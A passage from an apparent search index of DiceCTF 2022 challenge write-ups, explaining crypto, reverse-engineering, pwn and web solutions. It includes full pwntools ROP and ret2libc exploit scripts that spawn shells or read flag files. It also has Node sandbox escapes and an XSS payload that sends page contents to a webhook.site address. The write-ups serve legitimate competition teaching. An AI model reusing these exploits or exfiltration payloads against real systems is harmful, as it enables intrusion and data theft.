increase the chances of the RNG rerolling.","title":"crypto/rejected"},{"location":"Writeup/DiceCTF%202022/#cryptocorrelated","text":"A correlation attack on a LFSR, this challenge artificially demonstrates how you can attack a filtered LFSR. If you have 48 (= length of seed) clean bits, then you can invert the LFSR stream and find the seed. As each bit in the output stream is correct with 80% probability, you should expect to try 1 / 0.8^48 = 45,000 different subsets of the output stream before it works. As you are given 20,000 output bits, this is no problem at all. Unmodified information set decoding also works, mainly because the dimension of the LFSR is so small. You can also solve this with a customized fast correlation attack if you find sparse linear relations for the LFSR. As the state space is 2^48, you can use a birthday attack/meet-in-the-middle to find random linear relations each of length 3 which collide. That will give you a length 6 linear relation for the LFSR. This is much more complicated than the other solutions.","title":"crypto/correlated"},{"location":"Writeup/DiceCTF%202022/#cryptocommitment-issues","text":"We are given the result of a commitment of a signature of the flag. In particular, we have a large semiprime $N = pq$, a public exponenent $e$ with inverse $d$, and if m = bytes_to_long(flag) , then $s = m^d \\pmod{N}$ is the signature. A random value $r$ is then generated and we're given $c_1 = s + r \\pmod{N}$ and $c_2 = r^5 \\pmod{N}$. There's multiple ways to ultimately do the same computations that lead to the flag. I'll describe a solution that's due to Utaha from Balsn. Notice that the polynomial $p(t) = (c_1 - t)^5 - c_2 \\in \\mathbb{Z} N[t]$ vanishes at $t = s$. We then consider the quotient ring $\\mathbb{Z}_N[t]/(p)$. Since the lead coefficient of $p$ is a unit, this is a free $\\mathbb{Z}_N$-module of rank $\\deg p = 5$ with basis ${1, t, ..., t^4}$. In particular any $6$ elements in $\\mathbb{Z}_N[t]/(p)$ will satisfy a non-trivial $\\mathbb{Z}_N$-linear dependence. Using sage to efficiently write $$(t^e)^i = a {i0} + a_{i1}t + \\dots + a_{i4}t^4 \\in \\mathbb{Z} N[t]/(p)$$ for $i = 0, ..., 5$ we can use the matrix $A = (a {ij})_{ij}$ to compute a non-trivial linear dependence $$\\beta_0 + \\beta_1 \\cdot t^e + \\dots + \\beta_5 \\cdot (t^e)^5 = 0 \\in \\mathbb{Z}_N[t]/(p).$$ However since $p(s) = 0 \\pmod{N}$, the evaluation at $s$ map $$\\begin{aligned} E_s :\\;& \\mathbb{Z}_N[t] \\to \\mathbb{Z}_N \\ & \\;\\;\\;\\; q \\longmapsto q(s) \\end{aligned}$$ descends to a valid map $\\mathbb{Z}_N[t]/(p)\\to \\mathbb{Z}_N$ and we find that in fact, $$\\beta_0 + \\beta_1 \\cdot s^e + \\dots + \\beta_5 \\cdot (s^e)^5 = 0 \\pmod{N}.$$ But $s^e = m$ is just the flag, and we can now apply Coppersmith to recover $m$.","title":"crypto/commitment-issues"},{"location":"Writeup/DiceCTF%202022/#cryptolearning-without-errors","text":"This challenge is based on a passive attack which broke the CKKS cryptosystem last year . The gist of it is that CKKS Ring Learning With Errors cryptosystem encrypts the message as a pair (c_0, c_1) = (a, a * s + m + e) where s is the secret, m is the message, a is a random ring element, and e is a \"small\" secret error. If e and s are unknown, then recovering m from this requires solving a hard lattice problem. However, when decrypting, CKKS returns m + e , which just ... tells you ... what the secret error is. Basic algebra then gives s = (c_1 - (m + e)) * c_0^{-1} . Therefore, seeing a pair of encrypted and decrypted values is enough for a passive adversary to completely recover the secret key! However, this does seemingly require c_0 to be invertible in the ring, which for our parameters is Zmod(2^100)[x] / [x^1024] . The power-of-two modulus does (or so I thought) raise an issue. q = 1 << 100 N = 10 Rbase.<x> = PolynomialRing(Zmod(q)) R.<x> = Rbase.quotient(x^N + 1) Based on my testing, I had assumed that with overwhelming probability, c_0 would not have an inverse in the ring. This would force competitors to find another way to compute the required division. This appears to be supported by the linked paper (on page 18): A little difficulty arises due to the choice of q. The first implementation of CKKS, the HEAAN library sets q to a power of 2 to simplify the treatment of floating point numbers. Subsequent instantiations of CKKS use a prime (or square-free) q of the form h \u00b7 2^n + 1 together with the Number Theoretic Transform for very fast ring operations. For a (sufficiently large) prime q, the probability of a random element a being invertible is very close to 1, but this is not the case when q is a power of two. If a is not invertible, we can still recover partial information about the secret key s, and completely recover s by using multiple ciphertexts. My solution computes the inverse of c_0 in the p-adic extension to R with 20480 digits of precision. (Such extremely high precision is needed because the quotient polynomial I = x^1024 + 1 has I.discriminant() = 2^10240 ). However, some teams just... got lucky... and had a c_0 which was invertible. I'm not sure what the chances of this happening were -- clearly my initial tests led me to the wrong conclusion. The challenge still had a low number of solves, probably because RLWE is not common in CTFs.","title":"crypto/learning-without-errors"},{"location":"Writeup/DiceCTF%202022/#cryptoshibari","text":"This challenge implements a very weird compiler using a representation of the Braid Group . Braid Groups have previously been used in cryptography to implement a non-commutative variant of Diffie-Hellman. This was also the concept behind the proposed post-quantum (but actually completely insecure) scheme WalnutDSA . The cryptographically-interesting property of Braid Groups is that they have a computationally efficient normal form. That is, while there are (infinitely) many ways to write an element of the braid group in terms of the generators, you can convert all representations into the same canonical form. This has been proposed as a way to hide the individual factors of a product of group elements a * b * c . This challenge used the fact that the group-action of the braid group with $n$ strands on $AlternatingGroup(5)^{(2 n)}$ induced by the Yang-Baxter equation is sufficiently expressive that it is Turing complete. Specifically, you can evaluate CCNOT gates, which are computationally universal. The bulk of the source code provided for this challenge consists of a circuit-to-braid compiler and a braid-circuit evaluator. Additionally, I provided python bindings for a very fast braid group library, which can compute the canonical forms for the braids. I also presented a C++ version of the braid-circuit evaluator, which takes around 0.1 seconds to evaluate each sub-circuit. With all this done, we can finally discuss the challenge. The intended solution is 2 parts: 1) the braid is already in normal form, so you can import it into LNF faster than computing LNF on it. 2) apply a length-based attack because the entire circuit is reversible. if you guess that the first few gates are performing the subcircuit A := NOT bit 0; CCNOT(0,1,2) then the length of the circuit A^-1 * Circuit should be \"shorter\" than the length of Circuit , where length is the length of the LNF canonical form Whereas if you guess wrong and try the circuit B := NOT bit 0; NOT bit 1; CCNOT(0,1,2) , then the length of the circuit B^-1 * Circuit should be longer than the length of Circuit . So you can bruteforce the flag 2-bits at a time the step 1) of importing into LNF is needed because computing the LNF is so slow for the obfuscated braids (it's pretty quick for the unobfuscated braids). And the provided python bindings support quickly computing the LNF of LNF(a) * LNF(b) In hindsight, I should have released the LNF form of the braids so that players didn't have to import it. The only solution during the competition to this challenge used GPU brute force to find the flag \\shrug. I estimate that this took the equivalent of 10-years of cpu time. This was completely unintended.","title":"crypto/shibari"},{"location":"Writeup/DiceCTF%202022/#miscundefined","text":"Node.js wraps modules in a top-level function where require is passed in as an argument, meaning that require will always be accessible from arguments . However, since arguments is shadowed, you have to first create a function then access the parent function's arguments via arguments.callee.caller.arguments : (function(){return arguments.callee.caller.arguments[1](\"fs\").readFileSync(\"/flag.txt\", \"utf8\")})() For some reason, when making the challenge, I thought import wouldn't work due to Node defaulting to common.js modules, but it does for some reason, so there's a much easier cheese: import(\"fs\").then(m=>console.log(m.readFileSync(\"/flag.txt\", \"utf8\")))","title":"misc/undefined"},{"location":"Writeup/DiceCTF%202022/#miscsober-bishop","text":"To solve the challenge, players must find a flag which can be passed into OpenSSH's randomart algorithm. Due to the high-collision nature of the function, randomart(md5(flag)) is also provided. We need to implement a high-performance algorithm to identify valid paths through the grid. My approach was this: 1. Starting at our inital point, try moving to a diagonally adjacent position 2. Append the new position to a list of positions 3. Check if the number of times the current position appears in the list exceeds the number of times indicated by the grid - If we are at the end position, go to step 5 - If it does not exceed, then try moving to a new position - If it does, then pop the current position off the list 4. Repeat steps 1-3 on the next of the four possible positions 5. Convert the list of coordinates to a series of two-bit pairs, and convert them to a byte array 6. Check if the randomart(md5(array)) matches the provided randomart - If not, return to step 3 - If so, we're done, and print our flag To optimise this approach: - For the initial 4 positions, we can split the work across multiple cores easily, each exploring potential paths - We know the start position, and the first 5 characters ( dice{ ). Therefore we can hardcode the first 21 positions - At each position, we can convert our path to a string and check if it meets the constraints (begins with dice{ , all lowercase alphanumeric). If not, we can backtrack - If we have a 'complete' flag dice{[a-z0-9]+} , we can verify that each position has been visited the correct number of times - If all this is the case, we can attempt to calculate the MD5 My Rust solution took 20 seconds to extract the flag dice{unr4nd0m}","title":"misc/sober-bishop"},{"location":"Writeup/DiceCTF%202022/#pwnbaby-rop","text":"The challenge is a simple use-after-free, but with a few mitigations to make exploitation harder. Because the challenge uses a struct with a char * , players can easily turn the use-after-free into an arbitrary read and write without specialized heap voodoo. PIE is disabled because I'm nice. The challenge has several mitigations. 1) the glibc version is 2.34 (as printed out 3 different times when you connect to the server), which removed the __free_hook and __malloc_hook flags 2) full RELRO is used, which removes another collection of function pointers to overwrite 3) the binary uses seccomp to ban the execve syscall. So both calling a one-gadget and calling system(\"/bin/sh\") are off the table. 4) ASLR (but not PIE) is enabled, so the location of the stack is randomized. As the challenge name indicates, you are supposed to ROP your way to the flag, using an open-read-write ROP chain. So now the question is -- how can you turn your arbitrary read/write into a ROP chain? First, you'll need to leak a stack address. A nice description of how to leverage arbitrary reads in the binary/libc/heap/stack to determine the location of everything else can be found in this blog post . Note: these techniques were also heavily featured in the breach and containment challenges! The crucial section is that libc contains an environ pointer which points to a location on the stack. The sequence is: 1) read GOT to leak a libc address 2) read libc->environ to leak a stack address 3) compute the offset to the saved return addresses 4) ROP your way to the flag! Some teams had solutions which worked locally but not on remote. Some common fixed to these problems were: 1) use a write syscall instead of puts() to print the flag 2) double-check that the offset between *environ and the saved return address is correct on remote (should be -0x140 ). This has some slight variation depending on your configuration, but it's not hard to brute-force and check whether you're correct 3) using .bss as temporary storage instead of the heap. For whatever reason, exploits which tried to read the contents of flag.txt onto the heap were unreliable 4) open flag.txt in read-only mode. The redpwn jail we were using didn't support writing to disk 5) end your rop chain with an exit(0) syscall, which has the side-effect of flushing stdout My exploit is the following from pwn import * def split_before(s, t): i = s.index(t) return s[:i] def split_after(s, t): i = s.index(t) return s[len(t) + i:] ################################################# context.terminal = [\"tmux\", \"splitw\", \"-h\"] context.arch = 'amd64' context.binary = \"./run\" host = args.HOST or 'localhost' port = args.PORT or 31245 if args.LOCAL: r = process(\"./run\", env = {'LD_PRELOAD' : './libc.so.6'}) else: r = remote(host, port) binary = ELF(\"./run\") libc = ELF(\"./libc.so.6\") malloc_libc_OFFSET = libc.symbols[\"malloc\"] free_libc_OFFSET = libc.symbols[\"free\"] ################################################# def xfree(idx): print(r.recvuntil(b\"enter your command: \").decode()) r.sendline(b\"F\") print(r.recvuntil(b\"enter your index: \").decode()) r.sendline(\"{}\".format(idx).encode()) def xread(idx): print(r.recvuntil(b\"enter your command: \").decode()) r.sendline(b\"R\") print(r.recvuntil(b\"enter your index: \").decode()) r.sendline(\"{}\".format(idx).encode()) def xwrite(idx, value=b\"\"): print(r.recvuntil(b\"enter your command: \").decode()) r.sendline(b\"W\") print(r.recvuntil(b\"enter your index: \").decode()) r.sendline(\"{}\".format(idx).encode()) print(r.recvuntil(b\"enter your string: \").decode()) r.sendline(value) def xcreate(idx, length, value=b\"\"): print(r.recvuntil(b\"enter your command: \").decode()) r.sendline(b\"C\") print(r.recvuntil(b\"enter your index: \").decode()) r.sendline(\"{}\".format(idx).encode()) print(r.recvuntil(b\"How long is your safe_string: \").decode()) r.sendline(\"{}\".format(length).encode()) print(r.recvuntil(b\"enter your string: \").decode()) r.sendline(value) ################################################# xcreate(0, 128) xcreate(1, 128) xfree(0) xfree(1) got_free_addr = binary.symbols['got.free'] payload = p64(8) + p64(got_free_addr) xcreate(2, 16, payload) xread(0) print(r.recvuntil(b\"hex-encoded bytes\\n\").decode()) s = r.readline() s = s.decode() s = s.replace(\" \", \"\") s = bytes.fromhex(s) free_addr = u64(s) libc_base_addr = free_addr - free_libc_OFFSET # ------------------------------------------------- got_malloc_addr = binary.symbols['got.malloc'] payload = p64(8) + p64(got_malloc_addr) xwrite(2, payload) xread(0) print(r.recvuntil(b\"hex-encoded bytes\\n\").decode()) s = r.readline() s = s.decode() s = s.replace(\" \", \"\") s = bytes.fromhex(s) malloc_addr = u64(s) assert malloc_libc_OFFSET - free_libc_OFFSET == malloc_addr - free_addr # ------------------------------------------------- libc_environ_addr = libc_base_addr + libc.symbols[\"environ\"] payload = p64(8) + p64(libc_environ_addr) xwrite(2, payload) xread(0) print(r.recvuntil(b\"hex-encoded bytes\\n\").decode()) s = r.readline() s = s.decode() s = s.replace(\" \", \"\") s = bytes.fromhex(s) environ_addr = u64(s) print(hex(libc_environ_addr)) print(hex(environ_addr)) # ------------------------------------------------- libc.address = libc_base_addr rop = ROP(libc) # find offset with gdb, might need some brute-force for remote rip_addr = environ_addr - 0x140 # new file descriptor, totally brute-forcible fd = 3 # pointer to filename = \"flag.txt\" dst_filename = binary.bss(400) mov_rcx_rdx_addr = libc_base_addr + 0x0016c020 # 2.34 mov_rcx_rdx = p64(mov_rcx_rdx_addr) print(disasm(libc.read(mov_rcx_rdx_addr, 4))) rop(rcx=dst_filename, rdx=u64(b\"flag.txt\")) rop.raw(mov_rcx_rdx) rop(rcx=dst_filename + 8, rdx=0) rop.raw(mov_rcx_rdx) # sanity checks rop.puts(dst_filename) rop.write(1, dst_filename, 16, 1) rop.open(dst_filename, 0) rop.read(fd, dst_filename, 128) rop.write(1, dst_filename, 128) rop.exit(0) # ------------------------------------------------- real_payload = rop.chain() payload = p64(len(real_payload)) + p64(rip_addr) xwrite(2, payload) xwrite(0, real_payload) # gdb.attach(r) r.sendline(b\"E0\") sleep(0.1) print(r.recv())","title":"pwn/baby-rop"},{"location":"Writeup/DiceCTF%202022/#pwndata-eater","text":"There's usually a pointer to link_map on the stack somewhere, so just write some data to buf and overwrite the DT_STRTAB pointer in link_map->l_info . The offset to link_map varies a little bit but this should cover most of the possibilities. def sice(k): print(k) try: # do pwning r = conn() r.sendline(f'%s%{k}$s') r.sendline(b'/bin/sh\\0' + p64(exe.sym['buf'] + 16 - exe.section('.dynstr').index(b'memset\\x00')) + b'system\\0 ' + p64(0)*13 + p64(exe.sym['buf'])[:-1]) # make sure we got a shell r.recv(timeout=0.1) r.sendline('echo ginkoid') r.recvuntil('ginkoid') r.interactive() return True except EOFError: return False finally: r.close() for k in range(30, 50): if sice(k): break I recently found this doesn't work with ubuntu:18.04 and centos:6 for some reason, but the 14 other Docker images I tried were okay. Apologies if this caused you trouble! I initially only tested on a couple (including my own host) and it worked on all of them so I didn't bother trying more.","title":"pwn/data-eater"},{"location":"Writeup/DiceCTF%202022/#pwninterview-opportunity","text":"This challenge is a classic return2libc exploit. The bug here is 60 byte overflow into the 10 byte reason char array from the read() function call. ... int main(int argc, char **argv) { char reason[10]; ... read(0, reason, 70); puts(reason); } The only mitigations that are enabled are NX and ASLR. With NX enabled, we can't use shellcode. So ROP and ret2libc is our workaround. To defeat ASLR we have to do 2 passes. 1) leak the libc base address and return to main. 2) return to system() in libc. I have attached the solution script below. from pwn import * e = ELF(\"./interview-opportunity\") libc = ELF(\"./libc.so.6\") target = process(e.path) context.terminal = [\"tmux\", \"splitw\", \"-v\"] rdi = 0x401313 payload = b\"A\" * 0x22 payload += p64(rdi) payload += p64(e.got[\"puts\"]) payload += p64(e.symbols[\"puts\"]) payload += p64(e.symbols[\"main\"]) target.sendline(payload) target.recvuntil(b\"A\" * 0x22) target.recvline() leak = u64(target.recvline(keepends=False).ljust(8, b\"\\x00\")) - libc.symbols[\"puts\"] print(\"leak: {:#x}\".format(leak)) payload = b\"A\"*0x22 payload += p64(rdi + 1) payload += p64(rdi) payload += p64(next(libc.search(b\"/bin/sh\")) + leak) payload += p64(libc.symbols[\"system\"] + leak) target.sendline(payload) target.interactive()","title":"pwn/interview-opportunity"},{"location":"Writeup/DiceCTF%202022/#pwnnightmare","text":"REDACTED: We are redacting the solution for 1 week to give teams an attempt to claim the blood prize! The author writeup will be released after the first solve or the 1 week is up.","title":"pwn/nightmare"},{"location":"Writeup/DiceCTF%202022/#pwnroad-to-failure","text":"REDACTED: We are redacting the solution for 1 week to give teams an attempt to claim the blood prize! The author writeup will be released after the first solve or the1 week is up.","title":"pwn/road-to-failure"},{"location":"Writeup/DiceCTF%202022/#revuniversal","text":"This challenge presents an obfuscate quantum circuit for performing addition based on the Quantum Fourier Transform adder , which is the same addition algorithm featured in the linked writeups from last year's quantum rev challenges. The goal is to determine that number is being added. The obfuscation comes from that all of the Rz(theta) rotations have been converted into long sequences of H and T gates -- thus making the entire quantum circuit only use H, T, CNOT gates. The program I used for this was gridsynth , which is much more efficient than other approaches, eg as given by the construction of the Solovay-Kitaev theorem. No other obfuscations were applied, apart from those required to convert controlled-rotations into a mix of CNOT and single-qubit gates. $ gridsynth pi/128 SHTHTHTHTHTHTHTSHTHTHTHTSHTHTHTHTHTSHTSHTHTHTHTHTSHTHTHTSHTSHTHTSHTSHTSHTHTHTHTS HTHTHTHTHTSHTSHTHTSHTHTSHTSHTSHTSHTHTSHTSHTSHTSHTHTHTSHTSHTSHTHTHTHTSHTHTSHTHTHT SHTHTHTHTSHTHTSHTHTSHTSHTSHTHTHTHTHTHTHTSHTHTSHTHTHTSHTSHTHTHTSHTSHTSHTHTSHTHTHT HTSHTSHTSHSSSWWWWWWW The intended solution analyzes the structure of the QFT to isolate where the actual rotations are beign applied. The QFT consists of a long chain of CNOT gates and Rz rotations. The actual adder component consists of only Rz rotations, with no CNOT gates. So the longest chain of gates in the circuit which contains no CNOT gates is the adder. This is the only component which you need to statically analyze. You can determine this by reading about how the QFT works, or by looking at the generate.py script from last year's challenges. The following solution is essentially a quantum disassembler. For each single-qubit chain of H and T gates, it multiplies the gates together to determine what the quantum operator is. Then it determines that the corresponding Z-rotation angle is for this operator. Once all the rotation angles have been recovered, extracting the number being added (ie the flag) proceeds identically to quantum-rev 2 from last year . from math import pi, log2 import numpy as np # hadamard gate H = 1/np.sqrt(2)*np.array([[1, 1], [1,-1]], dtype=np.complex128) # T-phase gate T = np.array([[1, 0], [0, np.exp(1j * pi/4)]], dtype=np.complex128) # identity operator I = np.array([[1, 0], [0, 1]], dtype=np.complex128) ######################################## # num qubits n = 256 # max error epsilon = 1e-4 \"\"\" look for the start/end of the QFT. This includes a few extra gates (from the QFT) for qubit 0 and 1, so we just ignore those \"\"\" idcs = [] with open(\"converted_circuit.qasm\", \"r\") as f: for i,line in enumerate(f): if line == \"cx q[1],q[0];\\n\": idcs.append(i) # print(i) i0 = idcs[1] i1 = idcs[2] lines = open(\"converted_circuit.qasm\", \"r\").readlines() idcs = [i for i,line in enumerate(lines)] gates = lines[i0 + 1:i1 - 1] ######################################## unitaries = [I for _ in range(n)] for line in gates: instr = line[0] qubit = line[line.find(\"[\")+1:line.find(\"]\")] qubit = int(qubit) i = qubit if instr == 't': unitaries[i] = unitaries[i] @ T elif instr == 'h': unitaries[i] = unitaries[i] @ H else: raise ValueError(\"invalid gate\") # correct for QFT spillover for i in range(3): unitaries[i] = I ######################################## binary_reprs = \"\" unitaries = unitaries for i,u in enumerate(unitaries): delta = np.abs(u) - I if np.max(np.abs(delta)) > epsilon: raise ValueError(\"unitary is not approximately a phase gate\") u /= u[0][0] angle = np.angle(u[1][1]) b = str(int(angle < 0)) binary_reprs += b flag = int(binary_reprs[::-1], 2).to_bytes(n//8, \"little\") # first character is wrong b/c we included some extra QFT gates lol flag = b\"d\" + flag[1:] print(flag) However, during the competition the only solves were from a very amusing approach -- just run the program and it prints out the flag! Apparently the circuit simulator used in qiskit is able to very efficiently emulate the circuit in this problem without ever constructing the full statevector. The statevector has length 2^256 , so I had assumed that classically simulating the output would be completely impossible. Clearly, the IBM engineers and scientists behind qiskit deserve a raise >_<. The runtime of the below script for me is 45 minutes and it takes < 4 gigs of ram -- much less than 2^256! from qiskit import QuantumCircuit, Aer, execute simulator = Aer.get_backend('aer_simulator') qc = QuantumCircuit.from_qasm_file(\"converted_circuit.qasm\") # add some measurement gates at the end qubits = list(range(256)) qc.measure(qubits, qubits) job = execute(qc, simulator) result = job.result() print(result.get_counts()) num_chars = 256 // 8 x = list(result.get_counts().keys())[0] f = int(x, 2).to_bytes(num_chars, \"little\") print(f)","title":"rev/universal"},{"location":"Writeup/DiceCTF%202022/#webknock-knock","text":"This challenge gives a pastebin where notes are accessed by id and token . The tokens are generated as follows: generateToken(id) { return crypto .createHmac('sha256', this.secret) .update(id.toString()) .digest('hex'); } This looks okay, as long as the secret is chosen securely. Let's take a look at where that comes from: constructor() { this.notes = []; this.secret = `secret-${crypto.randomUUID}`; } If you are careful, you can spot the issue here: crypto.randomUUID is a function, but it is not called. Let's see what this looks like: > const crypto = require('crypto') undefined > const secret = `secret-${crypto.randomUUID}`; undefined > secret 'secret-function randomUUID(options) {\\n' + ' if (options !== undefined)\\n' + \" validateObject(options, 'options');\\n\" + ' const {\\n' + ' disableEntropyCache = false,\\n' + ' } = options || {};\\n' + '\\n' + \" validateBoolean(disableEntropyCache, 'options.disableEntropyCache');\\n\" + '\\n' + ' return disableEntropyCache ? getUnbufferedUUID() : getBufferedUUID();\\n' + '}' > Well, it looks like we know the secret. Looking at the source, we see that the flag is at id=0 , so we generate a token for that: > crypto.createHmac('sha256', secret).update('0').digest('hex') '7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264' Making a request to https://knock-knock.mc.ax/note?id=0&token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264 gives us the flag.","title":"web/knock-knock"},{"location":"Writeup/DiceCTF%202022/#webdicevault","text":"tl;dr use a combination of history.go(-x) and undocumented history.length xsleak to guess the location of a window and brute force flag path directory-by-directory. unintended: open vault window, redirect to your origin and get it to click vault buttons on your origin :( async function isLocation(win, url) { win.location = \"about:blank\"; await sleep(); const hlen1 = win.history.length; win.history.go(-1); await sleep(); win.location = url + \"#zzzzz\"; win.location = \"about:blank\"; await sleep(); const hlen2 = win.history.length; // reset history to initial state before running this function if (hlen1 + 1 === hlen2) { win.history.go(-2); } else if (hlen1 === hlen2) { win.history.go(-1); } return hlen1 + 1 === hlen2; }","title":"web/dicevault"},{"location":"Writeup/DiceCTF%202022/#webshadow","text":"full solution: https://shadow.mc.ax/?x=%3Cimg%20src%3D%22x%22%20onerror%3D%22find(%27steal%27)%3Bdocument.execCommand(%27insertHTML%27%2C%20false%2C%20%60%3Csvg%20onload%3D%26%2334%3Bwindow.location%3D%27https%3A%2F%2Fwebhook.site%2Fa602d76c-28a3-4e0a-8793-b183bc9bfba4%3Fa%3D%27%2BencodeURIComponent(this.parentNode.innerHTML)%26%2334%3B%3E%60)%3B%22%3E&y=-webkit-user-modify:%20read-write; css payload: -webkit-user-modify: read-write; js payload: find('steal'); document.execCommand('insertHTML', false, `<svg onload=\"window.location='https://webhook.site/a602d76c-28a3-4e0a-8793-b183bc9bfba4?a='+encodeURIComponent(this.parentNode.innerHTML)\">`); Use the obscure -webkit-user-modify property to make the div inside the shadowDOM editable then document.execCommand(\"insertHTML\",\"payload\") to write HTML inside it and get code execution inside the shadowDOM context. We can easily exfiltrate despite the CSP by setting window.location","title":"web/shadow"},{"location":"Writeup/DiceCTF%202022/#revtyped","text":"Here's the original version of the code before macro expansion (and with the flag added in): #![recursion_limit = \"10000\"] // #![allow(dead_code, unused_macros)] use std::marker::PhantomData; macro_rules! mktype { ($name: ident) => { struct $name; }; ($name: ident<$($t: ident),*>) => { struct $name<$($t),*>($(PhantomData<$t>),*); } } macro_rules! mktrait { ($name: ident) => { trait $name { type Output; } }; ($name: ident<$($arg: ident),*>) => { trait $name<$($arg),*> { type Output; } } } macro_rules! mkimpl { ($name: ident<$($gen: ident),*>[$($cgen: ty : $cons: path),*]($firstarg: ty $(, $arg: ty)*) = $output: ty) => { impl<$($gen),*> $name<$($arg),*> for $firstarg where $($cgen: $cons),* { type Output = $output; } } } macro_rules! mkout { ($name: ident, $firstarg: ty $(, $arg: ty)*) => { <$firstarg as $name<$($arg),*>>::Output } } mktype!(S<T>); mktype!(Z); mktrait!(Add<O>); mkimpl!(Add<T>[](T, Z) = T); mkimpl!(Add<T, K>[T: Add<K>](T, S<K>) = S<mkout!(Add, T, K)>); mktrait!(Mul<O>); mkimpl!(Mul<T>[](T, Z) = Z); mkimpl!(Mul<T, K>[T: Mul<K>, T: Add<mkout!(Mul, T, K)>](T, S<K>) = mkout!(Add, T, mkout!(Mul, T, K))); mktrait!(Sub<O>); mkimpl!(Sub<T>[](T, Z) = T); mkimpl!(Sub<T, K>[T: Sub<K>](S<T>, S<K>) = mkout!(Sub, T, K)); mktrait!(Neq<O>); mkimpl!(Neq<>[](Z, Z) = Z); mkimpl!(Neq<T>[](S<T>, Z) = S<Z>); mkimpl!(Neq<T>[](Z, S<T>) = S<Z>); mkimpl!(Neq<T, K>[T: Neq<K>](S<T>, S<K>) = mkout!(Neq, T, K)); mktype!(Nil); mktype!(Cons<H, T>); macro_rules! mklist { () => { Nil }; ($first: ty $(, $rest: ty)*) => { Cons<$first, mklist!($($rest),*)> } } macro_rules! mkcons { ($first: ty) => { $first }; ($first: ty $(, $rest: ty)*) => { Cons<$first, mkcons!($($rest),*)> } } mktrait!(Eval); macro_rules! mkfunc { ($name: ident) => { mktype!($name); mkimpl!(Eval<>[]($name) = $name); } } mkfunc!(AddFunc); mkfunc!(MulFunc); mkfunc!(SubFunc); mkfunc!(ConsFunc); mkfunc!(RawList); mkfunc!(GetLast); mkfunc!(AssertEq); mkfunc!(AssertNeq); mkfunc!(MapFunc); mkfunc!(MkConstraint); mkfunc!(MkNConstraint); mkfunc!(FirstOf3); mkfunc!(RestOf3); mkfunc!(ApplyFunc); mkimpl!(Eval<>[](Z) = Z); mkimpl!(Eval<T>[](S<T>) = S<T>); mkimpl!(Eval<>[](Cons<RawList, Nil>) = Nil); mkimpl!(Eval<H, T>[H: Eval](Cons<RawList, Cons<H, T>>) = Cons<mkout!(Eval, H), T>); mkimpl!( Eval<A, B>[A: Eval, B: Eval, mkout!(Eval, A): Sub<mkout!(Eval, B)>](mklist!(SubFunc, A, B)) = mkout!(Sub, mkout!(Eval, A), mkout!(Eval, B)) ); mkimpl!(Eval<T>[T: Eval](Cons<GetLast, mklist!(T)>) = mkout!(Eval, T)); mkimpl!( Eval<T, K, R>[mkcons!(GetLast, K, R): Eval, T: Eval](mkcons!(GetLast, T, K, R)) = mkout!(Eval, mkcons!(GetLast, K, R)) ); mkimpl!(Eval<T>[](Cons<AssertEq, mklist!(T)>) = Z); mkimpl!( Eval<T, K, R> [T: Eval, K: Eval, mkout!(Eval, T): Sub<mkout!(Eval, K)>, mkout!(Eval, K): Sub<mkout!(Eval, T)>, mkcons!(AssertEq, K, R): Eval] (mkcons!(AssertEq, T, K, R)) = mkout!(Eval, mkcons!(AssertEq, K, R)) ); mkimpl!( Eval<T, K> [T: Eval, K: Eval, mkout!(Eval, T): Neq<mkout!(Eval, K)>, mkout!(Neq, mkout!(Eval, T), mkout!(Eval, K)): Sub<S<Z>>] (Cons<AssertNeq, mklist!(T, K)>) = Z ); mkimpl!(Eval<F>[](mklist!(MapFunc, F)) = Nil); mkimpl!( Eval<F, H, T> [mklist!(F, H): Eval, mkcons!(MapFunc, F, T): Eval] (mkcons!(MapFunc, F, H, T)) = Cons<mkout!(Eval, mklist!(F, H)), mkout!(Eval, mkcons!(MapFunc, F, T))> ); mkimpl!(Eval<F, A, B, T>[](mklist!(MkConstraint, mklist!(F, A, B, T))) = mklist!(AssertEq, mklist!(F, A, B), T)); mkimpl!(Eval<F, A, B, T>[](mklist!(MkNConstraint, mklist!(F, A, B, T))) = mklist!(AssertNeq, mklist!(F, A, B), T)); mkimpl!(Eval<>[](mklist!(FirstOf3)) = Nil); mkimpl!(Eval<A, B, C, T>[Cons<FirstOf3, T>: Eval](mkcons!(FirstOf3, A, B, C, T)) = Cons<A, mkout!(Eval, Cons<FirstOf3, T>)>); mkimpl!(Eval<>[](mklist!(RestOf3)) = Nil); mkimpl!(Eval<A, B, C, T>[Cons<RestOf3, T>: Eval](mkcons!(RestOf3, A, B, C, T)) = mkcons!(B, C, mkout!(Eval, Cons<RestOf3, T>))); mkimpl!( Eval<F, T>[T: Eval, Cons<F, mkout!(Eval, T)>: Eval](mklist!(ApplyFunc, F, T)) = mkout!(Eval, Cons<F, mkout!(Eval, T)>) ); mkimpl!(Eval<T>[T: Eval](mklist!(ConsFunc, T)) = mkout!(Eval, T)); mkimpl!(Eval<H, T>[Cons<ConsFunc, T>: Eval](mkcons!(ConsFunc, H, T)) = Cons<H, mkout!(Eval, Cons<ConsFunc, T>)>); macro_rules! mkfold { ($fc: ident, $f: ident, $empty: ty, [$t: ident] $one: ty) => { mkimpl!(Eval<>[](mklist!($fc)) = $empty); mkimpl!(Eval<$t>[$t: Eval](mklist!($fc, $t)) = $one); mkimpl!( Eval<H1, H2, T> [H2: Eval, H1: $f<mkout!(Eval, H2)>, mkcons!($fc, mkout!($f, H1, mkout!(Eval, H2)), T): Eval] (Cons<$fc, Cons<H1, Cons<H2, T>>>) = mkout!(Eval, mkcons!($fc, mkout!($f, H1, mkout!(Eval, H2)), T)) ); } } mkfold!(AddFunc, Add, Z, [T] T); mkfold!(MulFunc, Mul, S<Z>, [T] T); type Ten = S<S<S<S<S<S<S<S<S<S<Z>>>>>>>>>>; type Hundred = mkout!(Mul, Ten, Ten); trait AsChar { const CHAR: char; } type Char_ = Z; impl AsChar for Char_ { const CHAR: char = '_'; } type Char0 = S<Z>; impl AsChar for Char0 { const CHAR: char = '0'; } type Char1 = S<S<Z>>; impl AsChar for Char1 { const CHAR: char = '1'; } type Char2 = S<S<S<Z>>>; impl AsChar for Char2 { const CHAR: char = '2'; } type Char3 = S<S<S<S<Z>>>>; impl AsChar for Char3 { const CHAR: char = '3'; } type Char4 = S<S<S<S<S<Z>>>>>; impl AsChar for Char4 { const CHAR: char = '4'; } type Char5 = S<S<S<S<S<S<Z>>>>>>; impl AsChar for Char5 { const CHAR: char = '5'; } type Char6 = S<S<S<S<S<S<S<Z>>>>>>>; impl AsChar 